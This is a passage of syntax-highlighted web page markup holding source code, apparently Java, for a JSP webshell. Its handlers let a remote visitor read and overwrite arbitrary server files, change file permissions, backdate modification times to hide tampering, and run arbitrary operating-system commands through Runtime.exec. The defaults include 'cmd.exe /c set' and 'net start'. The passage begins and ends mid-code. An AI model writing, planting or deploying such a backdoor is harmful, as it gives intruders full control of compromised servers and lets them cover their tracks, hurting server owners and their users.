&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Create / Edit File &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type='hidden' name='o' value='createFile'&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current File (import new file name and new file)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>filepath\<span class="string">" id=\"</span>editfilename\<span class="string">" value=\""+path+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;File Content&lt;br /&gt;&lt;textarea class=\"</span>area\<span class="string">" id=\"</span>filecontent\<span class="string">" name=\"</span>filecontent\<span class="string">" cols=\"</span><span class="number">100</span>\<span class="string">" rows=\"</span><span class="number">25</span>\<span class="string">" &gt;&lt;/textarea&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">"  type=\"</span>button\<span class="string">" value=\"</span>Back\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VEditInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(path);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (f.exists()) &#123;</span></span><br><span class="line"><span class="vbscript">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(f));</span></span><br><span class="line"><span class="vbscript">StringBuilder content = <span class="keyword">new</span> StringBuilder();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = reader.readLine();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (s != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">content.append(s+<span class="string">"\r\n"</span>);</span></span><br><span class="line"><span class="vbscript">s = reader.readLine();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">reader.close();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Create / Edit File &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type='hidden' name='o' value='createFile'&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current File (import new file name and new file)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>filepath\<span class="string">" id=\"</span>editfilename\<span class="string">" value=\""+path+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;File Content&lt;br /&gt;&lt;textarea class=\"</span>area\<span class="string">" id=\"</span>filecontent\<span class="string">" name=\"</span>filecontent\<span class="string">" cols=\"</span><span class="number">100</span>\<span class="string">" rows=\"</span><span class="number">25</span>\<span class="string">" &gt;"</span>+Util.htmlEncode(content.toString())+<span class="string">"&lt;/textarea&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">"  type=\"</span>button\<span class="string">" value=\"</span>Back\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> CreateFileInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> path = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> content = <span class="built_in">request</span>.getParameter(<span class="string">"filecontent"</span>);</span></span><br><span class="line"><span class="vbscript">BufferedWriter outs = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(<span class="keyword">new</span> File(path)));</span></span><br><span class="line"><span class="vbscript">outs.write(content,<span class="number">0</span>,content.length());</span></span><br><span class="line"><span class="vbscript">outs.close();</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Save File Success!"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VEditPropertyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> filepath = <span class="built_in">request</span>.getParameter(<span class="string">"filepath"</span>);</span></span><br><span class="line"><span class="vbscript">File f = <span class="keyword">new</span> File(filepath);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!f.exists())</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> read = f.canRead() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> write = f.canWrite() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">execute</span> = f.canExecute() ? <span class="string">"checked=\"</span>checked\<span class="string">""</span> : <span class="string">""</span>;</span></span><br><span class="line"><span class="vbscript">Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="vbscript">cal.setTimeInMillis(f.lastModified());</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Set File Property &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Current file (fullpath)&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>file\<span class="string">" id=\"</span>file\<span class="string">" value=\""+request.getParameter("</span>filepath<span class="string">")+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">120</span>\<span class="string">"  /&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>editProperty\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Read: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+read+<span class="string">" name=\"</span>read\<span class="string">" id=\"</span>checkbox\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  Write: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+write+<span class="string">" name=\"</span>write\<span class="string">" id=\"</span>checkbox2\<span class="string">"&gt; "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  Execute: "</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"  &lt;input type=\"</span>checkbox\<span class="string">" "</span>+<span class="keyword">execute</span>+<span class="string">" name=\"</span><span class="keyword">execute</span>\<span class="string">" id=\"</span>checkbox3\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;Instead &amp;raquo;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"year:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">year</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">YEAR</span>)+<span class="string">" id=\"</span><span class="built_in">year</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">4</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"month:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">month</span>\<span class="string">" value="</span>+(cal.<span class="keyword">get</span>(Calendar.<span class="built_in">MONTH</span>)+<span class="number">1</span>)+<span class="string">" id=\"</span><span class="built_in">month</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"day:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">date</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">DATE</span>)+<span class="string">" id=\"</span><span class="built_in">date</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">""</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"hour:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">hour</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">HOUR</span>)+<span class="string">" id=\"</span><span class="built_in">hour</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"minute:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">minute</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">MINUTE</span>)+<span class="string">" id=\"</span><span class="built_in">minute</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"second:"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>input\<span class="string">" name=\"</span><span class="built_in">second</span>\<span class="string">" value="</span>+cal.<span class="keyword">get</span>(Calendar.<span class="built_in">SECOND</span>)+<span class="string">" id=\"</span><span class="built_in">second</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">2</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>submit\<span class="string">" value=\"</span>Submit\<span class="string">"&gt; &lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" value=\"</span>Back\<span class="string">" id=\"</span>submit\<span class="string">" type=\"</span>button\<span class="string">" onclick=\"</span>history.back()\<span class="string">"&gt;&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> EditPropertyInvoker extends DefaultInvoker &#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doBefore()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> boolean doAfter()&#123;return <span class="literal">false</span>;&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> f = <span class="built_in">request</span>.getParameter(<span class="string">"file"</span>);</span></span><br><span class="line"><span class="vbscript">File file = <span class="keyword">new</span> File(f);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!file.exists())</span></span><br><span class="line"><span class="vbscript">return;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> read = <span class="built_in">request</span>.getParameter(<span class="string">"read"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> write = <span class="built_in">request</span>.getParameter(<span class="string">"write"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="keyword">execute</span> = <span class="built_in">request</span>.getParameter(<span class="string">"execute"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">year</span> = <span class="built_in">request</span>.getParameter(<span class="string">"year"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">month</span> = <span class="built_in">request</span>.getParameter(<span class="string">"month"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">date</span> = <span class="built_in">request</span>.getParameter(<span class="string">"date"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">hour</span> = <span class="built_in">request</span>.getParameter(<span class="string">"hour"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">minute</span> = <span class="built_in">request</span>.getParameter(<span class="string">"minute"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> <span class="built_in">second</span> = <span class="built_in">request</span>.getParameter(<span class="string">"second"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(read)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setReadable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setReadable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(write)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setWritable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setWritable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (Util.<span class="built_in">isEmpty</span>(<span class="keyword">execute</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">file.setExecutable(<span class="literal">false</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">file.setExecutable(<span class="literal">true</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">Calendar cal = Calendar.getInstance();</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">YEAR</span>,Integer.parseInt(<span class="built_in">year</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">MONTH</span>,Integer.parseInt(<span class="built_in">month</span>)<span class="number">-1</span>);</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">DATE</span>,Integer.parseInt(<span class="built_in">date</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">HOUR</span>,Integer.parseInt(<span class="built_in">hour</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">MINUTE</span>,Integer.parseInt(<span class="built_in">minute</span>));</span></span><br><span class="line"><span class="vbscript">cal.<span class="keyword">set</span>(Calendar.<span class="built_in">SECOND</span>,Integer.parseInt(<span class="built_in">second</span>));</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span>(file.setLastModified(cal.getTimeInMillis()))&#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Reset File Property Success!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript">JSession.setAttribute(MSG,<span class="string">"Reset File Property Failed!"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">response</span>.sendRedirect(SHELL_NAME+<span class="string">"?o=index"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">//VShell</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> VsInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> cmd = <span class="built_in">request</span>.getParameter(<span class="string">"command"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (cmd == <span class="literal">null</span>) cmd = <span class="string">"cmd.exe /c set"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (program == <span class="literal">null</span>) program = <span class="string">"cmd.exe /c net start &gt; "</span>+SHELL_DIR+<span class="string">"/Log.txt"</span>;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (JSession.getAttribute(MSG)!=<span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">Util.outMsg(out,JSession.getAttribute(MSG).toString());</span></span><br><span class="line"><span class="vbscript">JSession.removeAttribute(MSG);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;table width=\"</span><span class="number">100</span>%\<span class="string">" border=\"</span><span class="number">0</span>\<span class="string">" cellpadding=\"</span><span class="number">15</span>\<span class="string">" cellspacing=\"</span><span class="number">0</span>\<span class="string">"&gt;&lt;tr&gt;&lt;td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Execute Program &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>shell\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>program\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Parameter&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>program\<span class="string">" id=\"</span>program\<span class="string">" value=\""+program+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" value=\"</span><span class="keyword">Execute</span>\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;form name=\"</span>form1\<span class="string">" id=\"</span>form1\<span class="string">" action=\""+SHELL_NAME+"</span>\<span class="string">" method=\"</span>post\<span class="string">" &gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;h2&gt;Execute Shell &amp;raquo;&lt;/h2&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>o\<span class="string">" value=\"</span>shell\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input type=\"</span>hidden\<span class="string">" name=\"</span>type\<span class="string">" value=\"</span>command\<span class="string">"&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"Parameter&lt;br /&gt;&lt;input class=\"</span>input\<span class="string">" name=\"</span>command\<span class="string">" id=\"</span>command\<span class="string">" value=\""+cmd+"</span>\<span class="string">" type=\"</span>text\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;input class=\"</span>bt\<span class="string">" name=\"</span>submit\<span class="string">" id=\"</span>submit\<span class="string">" value=\"</span><span class="keyword">Execute</span>\<span class="string">" type=\"</span>submit\<span class="string">" size=\"</span><span class="number">100</span>\<span class="string">"  /&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/p&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/form&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/td&gt;"</span>+</span></span><br><span class="line"><span class="vbscript"><span class="string">"&lt;/tr&gt;&lt;/table&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125; catch (Exception e) &#123;</span></span><br><span class="line"><span class="vbscript">e.printStackTrace();</span></span><br><span class="line"><span class="vbscript">throw e ;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">private</span> static <span class="keyword">class</span> ShellInvoker extends DefaultInvoker&#123;</span></span><br><span class="line"><span class="vbscript"><span class="keyword">public</span> void invoke(HttpServletRequest <span class="built_in">request</span>,HttpServletResponse <span class="built_in">response</span>,HttpSession JSession) throws Exception&#123;</span></span><br><span class="line"><span class="vbscript">try &#123;</span></span><br><span class="line"><span class="vbscript">PrintWriter out = <span class="built_in">response</span>.getWriter();</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> type = <span class="built_in">request</span>.getParameter(<span class="string">"type"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (type.equals(<span class="string">"command"</span>)) &#123;</span></span><br><span class="line"><span class="vbscript">ins.<span class="keyword">get</span>(<span class="string">"vs"</span>).invoke(<span class="built_in">request</span>,<span class="built_in">response</span>,JSession);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;div style='margin:10px'&gt;&lt;hr/&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;pre&gt;"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> command = <span class="built_in">request</span>.getParameter(<span class="string">"command"</span>);</span></span><br><span class="line"><span class="vbscript"><span class="keyword">if</span> (!Util.<span class="built_in">isEmpty</span>(command)) &#123;</span></span><br><span class="line"><span class="vbscript">Process pro = Runtime.getRuntime().exec(command);</span></span><br><span class="line"><span class="vbscript">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(pro.getInputStream()));</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> s = reader.readLine();</span></span><br><span class="line"><span class="vbscript"><span class="keyword">while</span> (s != <span class="literal">null</span>) &#123;</span></span><br><span class="line"><span class="vbscript">out.println(Util.htmlEncode(Util.getStr(s)));</span></span><br><span class="line"><span class="vbscript">s = reader.readLine();</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">reader.close();</span></span><br><span class="line"><span class="vbscript">out.println(<span class="string">"&lt;/pre&gt;&lt;/div&gt;"</span>);</span></span><br><span class="line"><span class="vbscript">&#125;</span></span><br><span class="line"><span class="vbscript">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="vbscript"><span class="built_in">String</span> program = <span class="built_in">request</span>.getParameter(<span class="string">"program"</span>);</span></span><br><span class="line"><span 